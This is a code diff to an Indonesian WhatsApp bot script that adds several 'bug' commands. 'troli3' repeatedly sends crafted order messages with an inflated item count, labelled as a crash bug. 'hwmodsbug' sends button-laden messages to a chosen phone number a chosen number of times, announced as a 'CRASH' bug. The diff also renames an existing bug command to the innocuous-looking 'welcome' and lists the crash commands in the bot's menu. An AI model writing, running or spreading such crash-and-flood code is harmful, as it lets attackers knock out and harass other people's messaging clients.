@@ -600,6 +600,11 @@ haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }
 }
 break
 //=================================================//
+case '🔥':
+{
+haikal.relayMessage(from, { reactionMessage }, { messageId: "ADUH OM HW AMPUN 🥺🥺🙏" })
+}
+break
 case 'poll': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
@@ -756,6 +761,38 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
+case 'troli3': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (!isRegistered) return replyReg(mess.verif)
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
+	var troli2 = generateWAMessageFromContent(m.chat,{
+	"orderMessage": {
+	"orderId": "599519108102353",
+	"thumbnail": virgam,
+	"itemCount": 1999,
+	"status": "INQUIRY",
+	"surface": "CATALOG",
+	"message": " BY HW MODS WA ",
+	"orderTitle": " BUG TROLI ", // 
+	"sellerJid": "6281214281312@s.whatsapp.net",
+	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
+	}
+	},
+	{quoted: {
+key: { 
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
+},
+	}, contextInfo:{}}) 
+	haikal.relayMessage(m.chat, troli2.message, { messageId: troli2.key.id, a})
+	}
+	}
+	break
 case 'bug1': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
@@ -1364,6 +1401,28 @@ headerType: 1
 })
 break
 //=================================================//
+case 'hwmodsbug': {
+ if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+mm = text.split("|")[0]+'@s.whatsapp.net'
+jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+a = await deploy(`Succes send bug "CRASH🐼" Ke ${mm} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
+for (let i = 0; i < jumlah ; i++){
+await alpha.sendMessage(mm, { 
+text: '', 
+templateButtons: [
+{ callButton: { displayText: `OWNER`, phoneNumber: `6285714170944`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `6281214281312`}},
+{ urlButton: { displayText: `GROUP SHINCHAN`, url: `https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2`}},
+{ quickReplyButton: { displayText: `MY`, id: `Anjay Menger`}},
+{ quickReplyButton: { displayText: `NAME`, id: `AH SLEBEEW`}},
+{ quickReplyButton: { displayText: `HW MODS WA`, id: `JAGOAN OM?`}},
+]
+ })
+ await sleep(60* secon)
+}
+}
+break
 case 'jadibug1': {
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
@@ -5157,7 +5216,7 @@ anjay('Succes mematikan antilink di group ini 🌷')
 anjay('on untuk mengaktifkan, off untuk menonaktifkan')
 }
 }
-case 'bugghoib': {
+case 'welcome': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
@@ -5862,8 +5921,9 @@ caption:  ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 
 *[ 🌷 ] Bugmenu*
 
-Bug Cr Vip [ true / false ]
-bugghoib [ on / off ]
+hwmodsbug [ JUMLAH ]
+🔥 [ CRASH ]
+welcome [ on / off ]
 
 spam [ Reply Bug For Spam ]
 senbug [ Bug Pilihan ]
@@ -5902,6 +5962,7 @@ duc [ document ]
 ducu [ document ]
 troli [ Bug Troli ]
 troli2 [ Bug Troli 2 ]
+troli3 [ Bug Troli Crash ] jumlah
 jadibug1 [ Reply Video Jadi Bug Audio ]
 jadibug2 [ Reply Video Jadi Bug Mp3 ]
 jadibug3 [ Reply Audio Jadi Bug Vn ]
